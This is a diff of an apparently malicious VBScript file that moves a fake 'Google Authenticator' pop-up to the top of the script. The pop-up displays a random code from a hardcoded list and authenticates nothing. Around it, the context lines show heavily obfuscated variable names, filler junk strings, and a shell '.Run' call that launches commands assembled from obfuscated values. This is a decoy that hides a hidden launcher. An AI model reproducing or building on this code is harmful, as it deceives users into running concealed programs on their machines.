@@ -1,3 +1,26 @@
+Dim array(9)
+array(0) = "234166"
+array(1) = "923819"
+array(2) = "134665"
+array(3) = "195642"
+array(4) = "465102"
+array(5) = "355477"
+array(6) = "296082"
+array(7) = "964125"
+array(8) = "305478"
+array(9) = "532116"
+
+Randomize
+Dim randomIndex
+randomIndex = Int(Rnd * 10)
+
+Dim otp
+otp = array(randomIndex)
+
+Dim formattedOTP
+formattedOTP = Left(otp, 3) & " " & Mid(otp, 4, 3)
+
+MsgBox "Authentication code: " & formattedOTP, vbOKOnly, "Google Authenticator"
 Dim aaaaaaabncjds, qwoiughduiobhciwe, fwcwfcuhwfcnhioquf, zbxcvnbzcxvmzxb, pppppppppppooooooooodddd
 Dim oupgmruvfnblgtyuf, wygbvfqiuegwnyeb, eyucvbodibuwquios, wuernvgoreuihvnfgpoeruifvyhbpodia
 Dim ffffffffffffffffffffffffffaaaaaaaaaaaaasss, rgbyeuiowuiowuiowhno, MFHEHDOWNXKS
@@ -139,26 +162,3 @@ wrepofhn.Run """" & ppppppppeeeexxxxyyy & """ """ & pppppppsssscscccrrrriiiiiiug
 gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
 gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
 
-Dim array(9)
-array(0) = "234166"
-array(1) = "923819"
-array(2) = "134665"
-array(3) = "195642"
-array(4) = "465102"
-array(5) = "355477"
-array(6) = "296082"
-array(7) = "964125"
-array(8) = "305478"
-array(9) = "532116"
-
-Randomize
-Dim randomIndex
-randomIndex = Int(Rnd * 10)
-
-Dim otp
-otp = array(randomIndex)
-
-Dim formattedOTP
-formattedOTP = Left(otp, 3) & " " & Mid(otp, 4, 3)
-
-MsgBox "Authentication code: " & formattedOTP, vbOKOnly, "Google Authenticator"
